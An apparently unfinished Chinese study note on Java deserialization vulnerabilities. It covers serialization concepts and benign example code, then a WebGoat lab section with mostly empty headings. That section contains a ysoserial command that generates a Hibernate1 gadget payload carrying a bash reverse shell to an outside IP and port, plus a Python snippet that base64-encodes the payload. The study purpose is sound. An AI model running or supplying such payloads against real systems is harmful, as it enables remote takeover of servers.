![](https://img.yatjay.top/md/202203201205184.png)

# 涉及知识

## 概念

### Java序列化和反序列化

我们需要保存某—刻某个对象的信息，来进行一些操作。比如利用反序列化将程序运行的对象状态以二进制形式储存与文件系统中，然后可以在另—个程序中对序列化后的对象状态数据进行反序列化恢复对象。序列化是让Java对象脱离Java运行环境的一种手段，可以有效的实现多平台之间的通信、对象持久化存储。

#### 序列化(Serialization)

将对象的状态信息转换为可以存储或传输的形式的过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区。

`Java序列化`是指把Java对象转换为字节序列的过程(便于保存在内存、文件、数据库中)，`ObjectOutputStream`类的`writeObject()`方法可以实现序列化。

#### 反序列化

从存储区中读取该数据，并将其还原为对象的过程，称为反序列化。

`Java反序列化`是指把字节序列恢复为Java对象的过程，`ObjectInputStream`类的`readObject()`方法用于反序列化。

### Java中序列化和反序列化的API实现

![](https://img.yatjay.top/md/202203201501416.png)

实现`java.io.Serializable`接口才可被反序列化，而且所有属性必须是可序列化的(用`transient`关键字修饰的属性除外，不参与序列化过程)

在Java中，只要一个类实现了`java.io.Serializable`接口，那么它就可以通过`ObjectInputStream`与`ObejctOutputStream`序列化.

一个类的对象要想序列化成功，必须满足两个条件：

1. 该类必须实现` java.io.Serializable` 接口。

2. 该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的。

如果想知道一个 Java 标准类是否是可序列化的，可以通过查看该类的文档,查看该类有没有实现 `java.io.Serializable`接口。

## 利用







## 检测







## 修复

与前面漏洞修复类似











# 演示案例

## Java反序列化及命令执行代码测试

定义一个Person类如下，由于其实现` java.io.Serializable` 接口，而且所有属性都是可序列化的

```java
package com.company;

import java.io.Serializable;

public class Person implements Serializable {
    private int id;
    private String name;
    private int age;


    public int getId() {
        return id;
    }

    public void setId(int id) {
        this.id = id;
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public int getAge() {
        return age;
    }

    public void setAge(int age) {
        this.age = age;
    }

    public Person(int id, String name, int age) {
        this.id = id;
        this.name = name;
        this.age = age;
    }

    @Override
    public String toString() {
        return "Person{" +
                "id=" + id +
                ", name='" + name + '\'' +
                ", age=" + age +
                '}';
    }
}

```

### 序列化示例

用于测试序列化的带啊SerializationTest.java如下

```java
package com.company;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.ArrayList;
import java.util.List;


public class SerializationTest  {
    public static void main(String[] args) throws IOException {
        Person p1 = new Person(1, "jack", 19);
        Person p2 = new Person(2, "mary", 22);
        List<Person> list = new ArrayList();
        list.add(p1);
        list.add(p2);

        // 创建文件流
//FileOutputStream将数据写入 File 或 FileDescriptor 的输出流
        FileOutputStream fos = new FileOutputStream("D:/person.txt");  
//ObjectOutputStream将Java对象的原始数据类型和图形写入OutputStream
        ObjectOutputStream os = new ObjectOutputStream(fos);  
//writeObject方法对参数指定的obj对象进行序列化，把字节序列写到一个目标输出流中按Java的标准约定是给文件一个.ser扩展名
        os.writeObject(list);
        os.close();
        System.out.println("serialization  success");
    }
}

```

执行上述代码，得到序列化之后的对象，保存在`D:/person.txt`中

![](https://img.yatjay.top/md/202203211545420.png)



### 反序列化示例

用于测试反序列化的代码DeserializationTest.java如下

```java
package com.company;

import java.io.FileInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.util.ArrayList;
import java.util.List;


public class DeserializationTest {

    public static void main(String[] args) throws IOException {
        //创建文件输入流
        FileInputStream fis = new FileInputStream("D:/person.txt");
        //ObjectInputStream对以前使用ObjectOutputStream写入的基本数据和对象进行反序列化
        ObjectInputStream is = new ObjectInputStream(fis);
        //声明动态数组用于接收反序列化结果
        List<Person> list = new ArrayList<Person>();
        try {
            list = (List<Person>)is.readObject();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }

        is.close();

        //遍历list，输出
        for (Person person:list){
            System.out.println(person.toString());
        }

    }

}

```

执行上述代码，读取`D:/person.txt`并生成其反序列化结果输出

![](https://img.yatjay.top/md/202203211554989.png)

## WebGoat Javaweb靶场反序列化测试

本地Java环境搭建WebGoat失败，因此选择在Linux虚拟机中使用docker搭建靶场，详细参见[WebGoat靶场搭建.md](../Part0 补充内容/02_工具使用/WebGoat靶场搭建.md)

参考上述搭建过程进行搭建，本地靶场地址为：http://192.168.137.133:8080/WebGoat

勾选Java反序列化类漏洞，显示如下(已开启翻译)

![](https://img.yatjay.top/md/202203202257780.png)

==///////////////////////////==



































```bash
java -Dhibernate5 -cp hibernate-core-5.4.9.Final.jar;ysoserial-master-d367e379d9-1.jar ysoserial.GeneratePayload Hibernate1 "bash -c 'exec bash -i &>/dev/tcp/121.4.97.34/5812 <&1'" > payload.bin
```





## 2020-网鼎杯-朱雀组-Web-think Java真题复现













# 涉及资源

https://github.com/frohoff/ysoserial/releases

https://github.com/WebGoat/WebGoat/releases

https://github.com/NickstaDB/SerializationDumper/releases/tag/1.12



```python
import base64

c=open("payload.bin","rb").read()
cc=base64.urlsafe_b64encode(c)
open("payload.txt","wt",ecoding="utf-8").write(cc.decode())
```

